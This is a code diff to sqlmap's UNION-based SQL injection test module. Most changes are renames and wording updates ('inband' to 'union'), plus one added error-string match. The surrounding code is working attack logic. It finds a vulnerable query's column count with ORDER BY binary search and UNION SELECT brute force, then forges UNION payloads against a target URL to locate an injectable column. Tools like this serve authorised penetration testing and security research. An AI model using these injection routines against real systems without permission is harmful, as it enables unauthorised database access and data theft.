@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2012 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2013 sqlmap developers (http://sqlmap.org/)
 See the file 'doc/COPYING' for copying permission
 """
 
@@ -22,7 +22,7 @@ from lib.core.common import removeReflectiveValues
 from lib.core.common import singleTimeLogMessage
 from lib.core.common import singleTimeWarnMessage
 from lib.core.common import stdev
-from lib.core.common import wasLastRequestDBMSError
+from lib.core.common import wasLastResponseDBMSError
 from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
@@ -41,21 +41,21 @@ from lib.core.unescaper import unescaper
 from lib.request.comparison import comparison
 from lib.request.connect import Connect as Request
 
-def __findUnionCharCount(comment, place, parameter, value, prefix, suffix, where=PAYLOAD.WHERE.ORIGINAL):
+def _findUnionCharCount(comment, place, parameter, value, prefix, suffix, where=PAYLOAD.WHERE.ORIGINAL):
     """
     Finds number of columns affected by UNION based injection
     """
     retVal = None
 
-    def __orderByTechnique():
-        def __orderByTest(cols):
+    def _orderByTechnique():
+        def _orderByTest(cols):
             query = agent.prefixQuery("ORDER BY %d" % cols, prefix=prefix)
             query = agent.suffixQuery(query, suffix=suffix, comment=comment)
             payload = agent.payload(newValue=query, place=place, parameter=parameter, where=where)
             page, headers = Request.queryPage(payload, place=place, content=True, raise404=False)
-            return not re.search(r"(warning|error|order by|failed)", page or "", re.I) and comparison(page, headers)
+            return not re.search(r"(warning|error|order by|failed)", page or "", re.I) and comparison(page, headers) or re.search(r"data types cannot be compared or sorted", page or "", re.I)
 
-        if __orderByTest(1) and not __orderByTest(randomInt()):
+        if _orderByTest(1) and not _orderByTest(randomInt()):
             infoMsg = "ORDER BY technique seems to be usable. "
             infoMsg += "This should reduce the time needed "
             infoMsg += "to find the right number "
@@ -66,13 +66,13 @@ def __findUnionCharCount(comment, place, parameter, value, prefix, suffix, where
             lowCols, highCols = 1, ORDER_BY_STEP
             found = None
             while not found:
-                if __orderByTest(highCols):
+                if _orderByTest(highCols):
                     lowCols = highCols
                     highCols += ORDER_BY_STEP
                 else:
                     while not found:
                         mid = highCols - (highCols - lowCols) / 2
-                        if __orderByTest(mid):
+                        if _orderByTest(mid):
                             lowCols = mid
                         else:
                             highCols = mid
@@ -87,10 +87,10 @@ def __findUnionCharCount(comment, place, parameter, value, prefix, suffix, where
     lowerCount, upperCount = conf.uColsStart, conf.uColsStop
 
     if lowerCount == 1:
-        found = kb.orderByColumns or __orderByTechnique()
+        found = kb.orderByColumns or _orderByTechnique()
         if found:
             kb.orderByColumns = found
-            infoMsg = "target url appears to have %d columns in query" % found
+            infoMsg = "target url appears to have %d column%s in query" % (found, 's' if found > 1 else "")
             singleTimeLogMessage(infoMsg)
             return found
 
@@ -100,8 +100,8 @@ def __findUnionCharCount(comment, place, parameter, value, prefix, suffix, where
     min_, max_ = MAX_RATIO, MIN_RATIO
     pages = {}
 
-    for count in xrange(lowerCount, upperCount+1):
-        query = agent.forgeInbandQuery('', -1, count, comment, prefix, suffix, kb.uChar, where)
+    for count in xrange(lowerCount, upperCount + 1):
+        query = agent.forgeUnionQuery('', -1, count, comment, prefix, suffix, kb.uChar, where)
         payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)
         page, headers = Request.queryPage(payload, place=place, content=True, raise404=False)
         if not isNullValue(kb.uChar):
@@ -155,7 +155,7 @@ def __findUnionCharCount(comment, place, parameter, value, prefix, suffix, where
 
     return retVal
 
-def __unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLOAD.WHERE.ORIGINAL):
+def _unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLOAD.WHERE.ORIGINAL):
     validPayload = None
     vector = None
 
@@ -166,16 +166,16 @@ def __unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYL
 
     # For each column of the table (# of NULL) perform a request using
     # the UNION ALL SELECT statement to test it the target url is
-    # affected by an exploitable inband SQL injection vulnerability
+    # affected by an exploitable union SQL injection vulnerability
     for position in positions:
         # Prepare expression with delimiters
         randQuery = randomStr(UNION_MIN_RESPONSE_CHARS)
         phrase = "%s%s%s".lower() % (kb.chars.start, randQuery, kb.chars.stop)
         randQueryProcessed = agent.concatQuery("\'%s\'" % randQuery)
-        randQueryUnescaped = unescaper.unescape(randQueryProcessed)
+        randQueryUnescaped = unescaper.escape(randQueryProcessed)
 
-        # Forge the inband SQL injection request
-        query = agent.forgeInbandQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where)
+        # Forge the union SQL injection request
+        query = agent.forgeUnionQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where)
         payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)
 
         # Perform the request
@@ -194,10 +194,10 @@ def __unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYL
                 randQuery2 = randomStr(UNION_MIN_RESPONSE_CHARS)
                 phrase2 = "%s%s%s".lower() % (kb.chars.start, randQuery2, kb.chars.stop)
                 randQueryProcessed2 = agent.concatQuery("\'%s\'" % randQuery2)
-                randQueryUnescaped2 = unescaper.unescape(randQueryProcessed2)
+                randQueryUnescaped2 = unescaper.escape(randQueryProcessed2)
 
-                # Confirm that it is a full inband SQL injection
-                query = agent.forgeInbandQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where, multipleUnions=randQueryUnescaped2)
+                # Confirm that it is a full union SQL injection
+                query = agent.forgeUnionQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where, multipleUnions=randQueryUnescaped2)
                 payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)
 
                 # Perform the request
@@ -210,7 +210,7 @@ def __unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYL
                     fromTable = " FROM (%s) AS %s" % (" UNION ".join("SELECT %d%s%s" % (_, FROM_DUMMY_TABLE.get(Backend.getIdentifiedDbms(), ""), " AS %s" % randomStr() if _ == 0 else "") for _ in xrange(LIMITED_ROWS_TEST_NUMBER)), randomStr())
 
                     # Check for limited row output
-                    query = agent.forgeInbandQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where, fromTable=fromTable)
+                    query = agent.forgeUnionQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where, fromTable=fromTable)
                     payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)
 
                     # Perform the request
@@ -223,7 +223,7 @@ def __unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYL
                         logger.warn(warnMsg)
                         vector = (position, count, comment, prefix, suffix, kb.uChar, PAYLOAD.WHERE.NEGATIVE, kb.unionDuplicates)
 
-            unionErrorCase = kb.errorIsNone and wasLastRequestDBMSError()
+            unionErrorCase = kb.errorIsNone and wasLastResponseDBMSError()
 
             if unionErrorCase and count > 1:
                 warnMsg = "combined UNION/error-based SQL injection case found on "
@@ -235,24 +235,24 @@ def __unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYL
 
     return validPayload, vector
 
-def __unionConfirm(comment, place, parameter, prefix, suffix, count):
+def _unionConfirm(comment, place, parameter, prefix, suffix, count):
     validPayload = None
     vector = None
 
-    # Confirm the inband SQL injection and get the exact column
+    # Confirm the union SQL injection and get the exact column
     # position which can be used to extract data
-    validPayload, vector = __unionPosition(comment, place, parameter, prefix, suffix, count)
+    validPayload, vector = _unionPosition(comment, place, parameter, prefix, suffix, count)
 
-    # Assure that the above function found the exploitable full inband
+    # Assure that the above function found the exploitable full union
     # SQL injection position
     if not validPayload:
-        validPayload, vector = __unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLOAD.WHERE.NEGATIVE)
+        validPayload, vector = _unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLOAD.WHERE.NEGATIVE)
 
     return validPayload, vector
 
-def __unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix):
+def _unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix):
     """
-    This method tests if the target url is affected by an inband
+    This method tests if the target url is affected by an union
     SQL injection vulnerability. The test is done up to 50 columns
     on the target database table
     """
@@ -264,10 +264,10 @@ def __unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix
     if conf.uColsStop == conf.uColsStart:
         count = conf.uColsStart
     else:
-        count = __findUnionCharCount(comment, place, parameter, value, prefix, suffix, PAYLOAD.WHERE.ORIGINAL if isNullValue(kb.uChar) else PAYLOAD.WHERE.NEGATIVE)
+        count = _findUnionCharCount(comment, place, parameter, value, prefix, suffix, PAYLOAD.WHERE.ORIGINAL if isNullValue(kb.uChar) else PAYLOAD.WHERE.NEGATIVE)
 
     if count:
-        validPayload, vector = __unionConfirm(comment, place, parameter, prefix, suffix, count)
+        validPayload, vector = _unionConfirm(comment, place, parameter, prefix, suffix, count)
 
         if not all([validPayload, vector]) and not all([conf.uChar, conf.dbms]):
             warnMsg = "if UNION based SQL injection is not detected, "
@@ -281,7 +281,7 @@ def __unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix
                     warnMsg += "(e.g. --union-char=1) "
                 else:
                     conf.uChar = kb.uChar = str(randomInt(2))
-                    validPayload, vector = __unionConfirm(comment, place, parameter, prefix, suffix, count)
+                    validPayload, vector = _unionConfirm(comment, place, parameter, prefix, suffix, count)
 
             if not conf.dbms:
                 if not conf.uChar:
@@ -297,7 +297,7 @@ def __unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix
 
 def unionTest(comment, place, parameter, value, prefix, suffix):
     """
-    This method tests if the target url is affected by an inband
+    This method tests if the target url is affected by an union
     SQL injection vulnerability. The test is done up to 3*50 times
     """
 
@@ -305,7 +305,7 @@ def unionTest(comment, place, parameter, value, prefix, suffix):
         return
 
     kb.technique = PAYLOAD.TECHNIQUE.UNION
-    validPayload, vector = __unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix)
+    validPayload, vector = _unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix)
 
     if validPayload:
         validPayload = agent.removePayloadDelimiters(validPayload)
